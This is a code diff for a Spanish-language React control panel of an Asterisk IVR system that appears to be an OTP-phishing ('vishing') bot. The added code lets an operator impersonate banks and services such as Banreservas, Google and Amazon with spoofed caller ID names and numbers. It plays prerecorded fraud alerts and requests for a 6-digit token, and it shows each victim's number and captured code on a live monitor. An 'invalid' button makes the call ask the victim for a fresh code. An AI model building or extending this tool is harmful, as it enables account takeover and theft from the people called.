+                        <div className="flex items-center justify-between text-[10px] text-slate-500 pt-1 border-t border-slate-800/70">
+                          <span className="truncate">CID: {ent.defaultCallerName || 'Predeterminado'}</span>
+                          {isSelected ? (
+                            <span className="text-[10px] font-bold text-emerald-400 flex items-center gap-1 shrink-0">
+                              <Check className="w-3 h-3" /> Seleccionado
+                            </span>
+                          ) : (
+                            <span className="text-[10px] text-slate-500 group-hover:text-slate-300 transition-colors">
+                              Clic para activar
+                            </span>
+                          )}
+                        </div>
+                      </div>
+                    );
+                  })}
                 </div>
               </div>
 
@@ -1284,6 +1667,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                     >
                       <option value="">-- Beep estándar (espera dígitos) --</option>
+                      <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Por favor digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
+                      <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Por favor digite su TOKEN de 6 dígitos")</option>
                       <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp (Estándar)</option>
                       <option value={`custom/solicitar_otp_${selectedService}`}>custom/solicitar_otp_{selectedService}</option>
                       {audios.map((a) => (
@@ -1859,6 +2244,104 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
         </div>
       )}
 
+      {/* LIVE CAPTURED OTP MONITOR FOR AGENT (Prominent HUD) */}
+      {otpRecords.length > 0 && (
+        <div className="p-6 rounded-2xl bg-gradient-to-br from-slate-900 via-slate-950 to-slate-900 border-2 border-emerald-500/50 shadow-2xl shadow-emerald-500/10 space-y-4">
+          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
+            <div className="flex items-center gap-2.5">
+              <span className="relative flex h-3 w-3">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
+              </span>
+              <h3 className="text-sm font-extrabold text-white tracking-wide flex items-center gap-2">
+                <KeyRound className="w-4 h-4 text-emerald-400" />
+                <span>MONITOR EN VIVO DEL AGENTE: ÚLTIMO TOKEN CAPTURADO DEL CLIENTE</span>
+              </h3>
+            </div>
+            <div className="text-xs font-mono text-slate-400">
+              Objetivo: <strong className="text-sky-400 font-bold">{otpRecords[0].number}</strong> ({otpRecords[0].service || 'Banco / Antifraude'}) • <span className="text-slate-400">{otpRecords[0].timestamp}</span>
+            </div>
+          </div>
+
+          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 py-2">
+            {/* Visualización de los dígitos marcados en el teclado */}
+            <div className="space-y-1.5 text-center lg:text-left">
+              <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">
+                Dígitos digitados por el cliente en su teléfono:
+              </div>
+              <div className="flex items-center justify-center lg:justify-start gap-2">
+                {otpRecords[0].otp.split('').map((digit, idx) => (
+                  <span
+                    key={idx}
+                    className="w-12 h-14 sm:w-14 sm:h-16 flex items-center justify-center text-2xl sm:text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/80 shadow-lg shadow-emerald-500/20"
+                  >
+                    {digit}
+                  </span>
+                ))}
+              </div>
+            </div>
+
+            {/* Botones de Decisión del Agente (VÁLIDO / INVÁLIDO) */}
+            <div className="flex flex-wrap items-center justify-center lg:justify-end gap-3">
+              <button
+                type="button"
+                id="btn-live-agent-approve-otp"
+                onClick={() => handleVerifyOtp('valid', otpRecords[0].otp, otpRecords[0].number, otpRecords[0].id)}
+                className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-xs sm:text-sm shadow-xl transition-all ${
+                  otpRecords[0].status === 'valid'
+                    ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
+                    : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
+                }`}
+              >
+                <CheckCircle className="w-5 h-5" />
+                <span>CÓDIGO VÁLIDO</span>
+              </button>
+
+              <button
+                type="button"
+                id="btn-live-agent-reject-otp"
+                onClick={() => handleVerifyOtp('invalid', otpRecords[0].otp, otpRecords[0].number, otpRecords[0].id)}
+                title="Marca como inválido y el IVR le pide un nuevo token de 6 dígitos automáticamente al cliente"
+                className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-xs sm:text-sm shadow-xl transition-all ${
+                  otpRecords[0].status === 'invalid'
+                    ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
+                    : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
+                }`}
+              >
+                <XCircle className="w-5 h-5" />
+                <span>CÓDIGO INVÁLIDO</span>
+              </button>
+
+              <button
+                type="button"
+                id="btn-live-agent-copy-otp"
+                onClick={() => handleCopyOtp(otpRecords[0].otp, 'monitor-top')}
+                className="inline-flex items-center gap-1.5 px-4 py-3.5 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
+              >
+                {copiedId === 'monitor-top' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
+                <span>{copiedId === 'monitor-top' ? '¡Copiado!' : 'Copiar'}</span>
+              </button>
+            </div>
+          </div>
+
+          <div className="flex items-center justify-between text-xs pt-2 border-t border-slate-800/80">
+            <span className="text-slate-400">
+              Estado actual del código:{' '}
+              {otpRecords[0].status === 'valid' ? (
+                <strong className="text-emerald-400 font-bold">✓ VÁLIDO (Aprobado por el asesor)</strong>
+              ) : otpRecords[0].status === 'invalid' ? (
+                <strong className="text-rose-400 font-bold">✗ INVÁLIDO (Rechazado por el asesor)</strong>
+              ) : (
+                <strong className="text-amber-400 font-bold">⏳ Pendiente de decisión del asesor</strong>
+              )}
+            </span>
+            <span className="text-[11px] text-slate-500 font-mono">
+              Audio configurado en IVR: <span className="text-emerald-400">"Por favor digite su TOKEN de 6 dígitos"</span>
+            </span>
+          </div>
+        </div>
+      )}
+
       {/* HISTORICAL TABLE OF CAPTURED OTPS */}
       <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
         <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
@@ -2190,6 +2673,377 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
                 <Check className="w-4 h-4" />
                 <span>Asignar a la Campaña</span>
               </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Modal para Editar Guión / Entidad y Asignar sus 4 Audios Pregrabados */}
+      {isEntityModalOpen && editingEntity && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
+          <div className="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-2xl overflow-hidden shadow-2xl space-y-4 my-8">
+            {/* Header */}
+            <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/60">
+              <div className="flex items-center gap-2.5">
+                <div className="p-2 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
+                  <Settings2 className="w-5 h-5" />
+                </div>
+                <div>
+                  <h3 className="text-base font-bold text-white">Editar Guión y Asignación de Audios</h3>
+                  <p className="text-xs text-slate-400">
+                    Personaliza los nombres, Caller ID y las 4 locuciones pregrabadas de esta entidad
+                  </p>
+                </div>
+              </div>
+              <button
+                type="button"
+                onClick={() => {
+                  setIsEntityModalOpen(false);
+                  setEditingEntity(null);
+                }}
+                className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all"
+              >
+                <X className="w-4 h-4" />
+              </button>
+            </div>
+
+            {/* Body */}
+            <div className="p-5 space-y-5 max-h-[75vh] overflow-y-auto">
+              {/* Bloque 1: Datos de la Entidad */}
+              <div className="space-y-3">
+                <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
+                  <Building2 className="w-3.5 h-3.5 text-emerald-400" />
+                  <span>1. Identidad de la Simulación</span>
+                </h4>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                  <div className="space-y-1">
+                    <label className="text-xs font-semibold text-slate-300">Nombre de la Entidad / Banco</label>
+                    <input
+                      type="text"
+                      value={editingEntity.name}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, name: e.target.value })}
+                      placeholder="ej. Banco Banreservas"
+                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
+                    />
+                  </div>
+
+                  <div className="space-y-1">
+                    <label className="text-xs font-semibold text-slate-300">Subtítulo / Situación de Fraude</label>
+                    <input
+                      type="text"
+                      value={editingEntity.subtitle}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, subtitle: e.target.value })}
+                      placeholder="ej. Transferencia desconocida"
+                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
+                    />
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                  <div className="space-y-1">
+                    <label className="text-xs font-semibold text-slate-300">Icono Representativo</label>
+                    <select
+                      value={editingEntity.icon}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, icon: e.target.value as any })}
+                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
+                    >
+                      <option value="building">Banco / Financiera (Edificio)</option>
+                      <option value="card">Tarjeta de Crédito (Tarjeta)</option>
+                      <option value="message">WhatsApp / Telegram (Mensaje)</option>
+                      <option value="lock">Google / Apple ID (Seguridad)</option>
+                      <option value="shopping">Amazon / Pedidos (Bolsa)</option>
+                      <option value="sliders">Personalizado (Control)</option>
+                    </select>
+                  </div>
+
+                  <div className="space-y-1">
+                    <label className="text-xs font-semibold text-slate-300">Caller ID Name sugerido</label>
+                    <input
+                      type="text"
+                      value={editingEntity.defaultCallerName || ''}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, defaultCallerName: e.target.value })}
+                      placeholder="ej. BANRESERVAS"
+                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
+                    />
+                  </div>
+
+                  <div className="space-y-1">
+                    <label className="text-xs font-semibold text-slate-300">Caller ID Number sugerido</label>
+                    <input
+                      type="text"
+                      value={editingEntity.defaultCallerNum || ''}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, defaultCallerNum: e.target.value })}
+                      placeholder="ej. 8099602110"
+                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
+                    />
+                  </div>
+                </div>
+              </div>
+
+              {/* Bloque 2: Asignación de los 4 Audios */}
+              <div className="space-y-3 pt-3 border-t border-slate-800">
+                <div className="flex items-center justify-between">
+                  <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
+                    <Volume2 className="w-3.5 h-3.5 text-emerald-400" />
+                    <span>2. Locuciones Pregrabadas Asignadas a este Guión</span>
+                  </h4>
+                  <span className="text-[11px] text-slate-400">Escucha con Play antes de guardar</span>
+                </div>
+
+                {/* 1. Saludo / Alerta Inicial */}
+                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <div className="text-xs font-bold text-emerald-300 flex items-center gap-1.5">
+                        <Volume2 className="w-3.5 h-3.5 text-emerald-400" />
+                        <span>1. Saludo / Alerta Inicial (Intro)</span>
+                      </div>
+                      <div className="text-[11px] text-slate-400">
+                        Lo que escucha el cliente inmediatamente al contestar la llamada.
+                      </div>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(editingEntity.introAudioPath, 'modal_intro')}
+                      disabled={!editingEntity.introAudioPath}
+                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
+                      title="Reproducir audio"
+                    >
+                      {playingAudioKey === 'modal_intro' ? (
+                        <Pause className="w-4 h-4 text-emerald-400 animate-pulse" />
+                      ) : (
+                        <Play className="w-4 h-4 text-slate-300" />
+                      )}
+                    </button>
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <select
+                      value={editingEntity.introAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
+                    >
+                      <option value="custom/banrearreglado">custom/banrearreglado (Banreservas Intro)</option>
+                      <option value="custom/alerta_cargo_tarjeta">custom/alerta_cargo_tarjeta</option>
+                      <option value="custom/alerta_migracion_whatsapp">custom/alerta_migracion_whatsapp</option>
+                      <option value="custom/alerta_seguridad_google">custom/alerta_seguridad_google</option>
+                      <option value="custom/alerta_compra_amazon">custom/alerta_compra_amazon</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <input
+                      type="text"
+                      value={editingEntity.introAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
+                      placeholder="Ruta personalizada (ej. custom/mi_audio)"
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-emerald-500"
+                    />
+                  </div>
+                </div>
+
+                {/* 2. Solicitud OTP */}
+                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <div className="text-xs font-bold text-purple-300 flex items-center gap-1.5">
+                        <KeyRound className="w-3.5 h-3.5 text-purple-400" />
+                        <span>2. Solicitud de Código OTP (Prompt)</span>
+                      </div>
+                      <div className="text-[11px] text-slate-400">
+                        Locución que pide a la persona ingresar los dígitos de su código de seguridad.
+                      </div>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(editingEntity.promptAudioPath, 'modal_prompt')}
+                      disabled={!editingEntity.promptAudioPath}
+                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
+                      title="Reproducir audio"
+                    >
+                      {playingAudioKey === 'modal_prompt' ? (
+                        <Pause className="w-4 h-4 text-purple-400 animate-pulse" />
+                      ) : (
+                        <Play className="w-4 h-4 text-slate-300" />
+                      )}
+                    </button>
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <select
+                      value={editingEntity.promptAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-purple-500"
+                    >
+                      <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Por favor digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
+                      <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Por favor digite su TOKEN de 6 dígitos")</option>
+                      <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp (Estándar)</option>
+                      <option value="custom/solicitar_otp_tarjeta">custom/solicitar_otp_tarjeta</option>
+                      <option value="custom/solicitar_codigo_sms">custom/solicitar_codigo_sms</option>
+                      <option value="custom/solicitar_codigo_google">custom/solicitar_codigo_google</option>
+                      <option value="custom/solicitar_codigo_amazon">custom/solicitar_codigo_amazon</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <input
+                      type="text"
+                      value={editingEntity.promptAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
+                      placeholder="Ruta personalizada (ej. custom/solicitar_otp)"
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-purple-500"
+                    />
+                  </div>
+                </div>
+
+                {/* 3. Transferencia a Asesor (Opción 1) */}
+                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <div className="text-xs font-bold text-sky-300 flex items-center gap-1.5">
+                        <PhoneForwarded className="w-3.5 h-3.5 text-sky-400" />
+                        <span>3. Transferencia a Asesor (Opción 1 - "Un momento por favor...")</span>
+                      </div>
+                      <div className="text-[11px] text-slate-400">
+                        Audio reproducido cuando el cliente presiona 1 antes de conectar a tu softphone X-Lite ({agentExtension}).
+                      </div>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(editingEntity.agentAudioPath, 'modal_agent')}
+                      disabled={!editingEntity.agentAudioPath}
+                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
+                      title="Reproducir audio"
+                    >
+                      {playingAudioKey === 'modal_agent' ? (
+                        <Pause className="w-4 h-4 text-sky-400 animate-pulse" />
+                      ) : (
+                        <Play className="w-4 h-4 text-slate-300" />
+                      )}
+                    </button>
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <select
+                      value={editingEntity.agentAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-sky-500"
+                    >
+                      <option value="custom/conectar_asesor_banco">custom/conectar_asesor_banco ("Un momento, transfiriendo...")</option>
+                      <option value="custom/conectar_asesor">custom/conectar_asesor</option>
+                      <option value="custom/conectar_asesor_tarjetas">custom/conectar_asesor_tarjetas</option>
+                      <option value="custom/conectar_soporte_tecnico">custom/conectar_soporte_tecnico</option>
+                      <option value="custom/conectar_soporte_cuentas">custom/conectar_soporte_cuentas</option>
+                      <option value="custom/conectar_soporte_pedidos">custom/conectar_soporte_pedidos</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <input
+                      type="text"
+                      value={editingEntity.agentAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
+                      placeholder="Ruta personalizada (ej. custom/conectar_asesor)"
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-sky-500"
+                    />
+                  </div>
+                </div>
+
+                {/* 4. Validación Exitosa */}
+                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <div className="text-xs font-bold text-emerald-300 flex items-center gap-1.5">
+                        <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
+                        <span>4. Confirmación / Éxito OTP</span>
+                      </div>
+                      <div className="text-[11px] text-slate-400">
+                        Mensaje final tras capturar o validar exitosamente el código.
+                      </div>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(editingEntity.successAudioPath, 'modal_success')}
+                      disabled={!editingEntity.successAudioPath}
+                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
+                      title="Reproducir audio"
+                    >
+                      {playingAudioKey === 'modal_success' ? (
+                        <Pause className="w-4 h-4 text-emerald-400 animate-pulse" />
+                      ) : (
+                        <Play className="w-4 h-4 text-slate-300" />
+                      )}
+                    </button>
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <select
+                      value={editingEntity.successAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
+                    >
+                      <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
+                      <option value="custom/tarjeta_protegida">custom/tarjeta_protegida</option>
+                      <option value="custom/verificacion_exitosa">custom/verificacion_exitosa</option>
+                      <option value="custom/acceso_restringido_exito">custom/acceso_restringido_exito</option>
+                      <option value="custom/pedido_cancelado_exito">custom/pedido_cancelado_exito</option>
+                      <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <input
+                      type="text"
+                      value={editingEntity.successAudioPath}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
+                      placeholder="Ruta personalizada (ej. custom/exito)"
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-emerald-500"
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Footer */}
+            <div className="p-4 border-t border-slate-800 bg-slate-950/60 flex items-center justify-between gap-3">
+              <div>
+                {editingEntity.id.startsWith('custom_') && (
+                  <button
+                    type="button"
+                    onClick={() => handleDeleteEntity(editingEntity.id)}
+                    className="px-3 py-2 rounded-xl text-xs font-semibold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 transition-all"
+                  >
+                    Eliminar este guión
+                  </button>
+                )}
+              </div>
+
+              <div className="flex items-center gap-2">
+                <button
+                  type="button"
+                  onClick={() => {
+                    setIsEntityModalOpen(false);
+                    setEditingEntity(null);
+                  }}
+                  className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
+                >
+                  Cancelar
+                </button>
+                <button
+                  type="button"
+                  onClick={() => handleSaveEntity(editingEntity)}
+                  disabled={!editingEntity.name.trim()}
+                  className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black shadow-lg shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
+                >
+                  <Save className="w-4 h-4" />
+                  <span>Guardar y Asignar a Asterisk</span>
+                </button>
+              </div>
             </div>
           </div>
         </div>
